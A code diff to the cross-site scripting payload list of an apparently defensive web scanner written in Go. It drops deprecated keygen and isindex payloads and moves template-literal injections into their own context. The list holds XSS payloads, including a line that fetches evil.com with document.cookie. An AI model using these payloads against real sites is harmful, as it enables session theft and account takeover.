@@ -37,9 +37,6 @@ var extendedPayloads = map[context.ContextType][]PayloadTemplate{
 		// Short payloads for length-constrained inputs
 		{Value: `<q/oncut=alert(1)>`, Severity: model.High, Desc: "Short HTML5 oncut (15 chars)"},
 		{Value: `<b/onmouseover=alert(1)>`, Severity: model.Medium, Desc: "Short onmouseover"},
-		{Value: `<keygen autofocus onfocus=alert(1)>`, Severity: model.High, Desc: "Deprecated keygen autofocus"},
-		{Value: `<isindex action=javascript:alert(1) type=image>`, Severity: model.Medium, Desc: "Isindex javascript action"},
-		{Value: `<isindex type=image src=1 onerror=alert(1)>`, Severity: model.High, Desc: "Isindex onerror"},
 
 		// Portal / popover (newer HTML features)
 		{Value: `<portal src=javascript:alert(1)>`, Severity: model.Medium, Desc: "Portal javascript src"},
@@ -86,12 +83,15 @@ var extendedPayloads = map[context.ContextType][]PayloadTemplate{
 		{Value: `';eval('\x61lert(1)')//`, Severity: model.High, Desc: "Hex-escaped alert"},
 		{Value: `';eval('\u0061lert(1)')//`, Severity: model.High, Desc: "Unicode-escaped alert"},
 
-		// Template literal injection variants
-		{Value: `${document.cookie}`, Severity: model.Medium, Desc: "Template literal cookie exfil"},
-		{Value: `${fetch('//evil.com?c='+document.cookie)}`, Severity: model.Medium, Desc: "Template literal fetch exfil"},
-
 		// Multi-line comment breakout
 		{Value: `*/alert(1)/*`, Severity: model.Medium, Desc: "JS multi-line comment breakout"},
+	},
+
+	context.ContextJSTemplateLiteral: {
+		// Template literal injection variants (moved from ContextJSString —
+		// ${...} interpolation only executes inside backtick-delimited literals)
+		{Value: `${document.cookie}`, Severity: model.Medium, Desc: "Template literal cookie exfil"},
+		{Value: `${fetch('//evil.com?c='+document.cookie)}`, Severity: model.Medium, Desc: "Template literal fetch exfil"},
 	},
 
 	context.ContextURLAttr: {
